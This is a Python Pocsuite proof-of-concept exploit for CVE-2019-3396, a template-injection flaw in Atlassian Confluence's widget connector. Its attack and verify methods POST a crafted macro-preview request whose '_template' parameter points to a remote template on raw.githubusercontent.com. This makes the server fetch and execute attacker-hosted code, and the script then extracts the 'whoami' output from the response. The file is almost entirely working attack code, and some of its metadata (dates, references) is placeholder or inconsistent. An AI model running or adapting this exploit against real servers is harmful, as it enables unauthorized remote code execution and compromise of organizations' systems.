#!/usr/bin/python
# -*- coding:utf-8 -*-

import string
import random
import time
import re
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register

def assic_string(data):
    assic = data[0].replace('\n', ':').replace('\n', ':').split(' 0:')[1].split('::')[0].split(':')
    whoami = ''
    for i in assic:
        whoami += chr(int(i.strip()))
    return whoami

class TestPOC(POCBase):
    name = 'Confluence rest traversal Command Execution (CVE-2019-3396)'
    vulID = '0'
    author = ['']
    vulType = 'cmd-exec'
    version = '1'
    references = ['re']
    desc = '''Atlassian公司的Confluence Server和Data Center产品中使用的widgetconnecter组件(版本<=3.1.3)中存在服务器端模板注入(SSTI)漏洞。攻击者可以利用该漏洞实现对目标系统进行路径遍历攻击、服务端请求伪造(SSRF)、远程代码执行(RCE)。'''

    vulDate = '2014-10-16'
    createDate = '2019-04-11'
    updateDate = '2019-04-11'

    appName = 'Confluence Server/Confluence Data Center'
    appVersion = '1.xx-5.xx/<6.6.12/6.7.x-6.11.x/<6.12.3/<6.13.2/<6.14.2'
    appPowerLink = 'http://www.shdsd.com/atlassian/confluence/index.html'
    samples = ['re']

    def _attack(self):
        """attack mode"""
        result = {}
        self.url = self.url.strip('/') + "/rest/tinymce/1/macro/preview"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
            "Referer": self.url,
            "Content-Type": "application/json; charset=utf-8"
        }
        data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/LRestless/confluencePoc/master/ttest.vm"}}}'
        resp = req.post(self.url, data=data, headers=headers)
        if resp.status_code == 200:
            whoami_data = re.findall(r'<div class="wiki-content">(.*?)</div>', resp.content, re.S)
            if whoami_data:
                whoami = assic_string(whoami_data)
                result['extra'] = {}
                result['extra']['whoami'] = whoami
        return self.parse_output(result)

    def _verify(self):
        """verify  mode"""
        result = {}
        self.url = self.url.strip('/') + "/rest/tinymce/1/macro/preview"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
            "Referer": self.url,
            "Content-Type": "application/json; charset=utf-8"
        }
        data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"https://raw.githubusercontent.com/LRestless/confluencePoc/master/text.mv"}}}'
        resp = req.post(self.url, data=data, headers=headers)
        if resp.status_code == 200:
            whoami_data = re.findall(r'<div class="wiki-content">(.*?)</div>', resp.content, re.S)
            if whoami_data:
                whoami = assic_string(whoami_data)
                if '123' in whoami:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

